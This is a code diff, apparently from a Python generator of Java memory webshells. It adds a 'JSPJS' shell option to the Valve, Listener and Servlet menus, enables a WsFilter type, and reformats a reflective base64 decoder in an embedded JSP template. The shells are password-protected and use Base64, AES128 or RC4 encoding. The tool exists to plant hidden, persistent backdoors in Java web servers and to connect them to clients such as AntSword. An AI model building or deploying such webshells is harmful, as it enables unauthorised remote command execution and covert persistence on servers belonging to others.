@@ -4,46 +4,59 @@ MENU = {
             # "Executor": {},
             "Valve": {
                 "RAW": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "Base64": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "AES128": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "RC4": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
             },
             "Listener": {
                 "RAW": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "Base64": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "AES128": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "RC4": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
             },
             # "Filter": {},
-            # "WsFilter": {},
-            "Servlet": {
+            "WsFilter": {
                 "RAW": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "Base64": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "AES128": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
                 "RC4": {
-                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}
+                    "CMD": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
+                },
+            },
+            "Servlet": {
+                "RAW": {
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
+                },
+                "Base64": {
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
+                },
+                "AES128": {
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
+                },
+                "RC4": {
+                    "CMD": {"PassWord": {}}, "AntSword": {"PassWord": {}}, "JSPJS": {"PassWord": {}}
                 },
             },
         }
@@ -77,12 +90,12 @@ JSP = """
         try {{
             base64=Class.forName("sun.misc.BASE64Decoder");
             Object decoder = base64.newInstance();
-            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {{String.class }}).invoke(decoder, new Object[] {{ str }});
+            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {{String.class}}).invoke(decoder, new Object[] {{str}});
         }} catch (Exception e) {{
             try {{
                 base64=Class.forName("java.util.Base64");
                 Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-                value = (byte[])decoder.getClass().getMethod("decode", new Class[] {{ String.class }}).invoke(decoder, new Object[] {{ str }});
+                value = (byte[])decoder.getClass().getMethod("decode", new Class[] {{String.class}}).invoke(decoder, new Object[] {{str}});
             }} catch (Exception ee) {{}}
         }}
         return value;
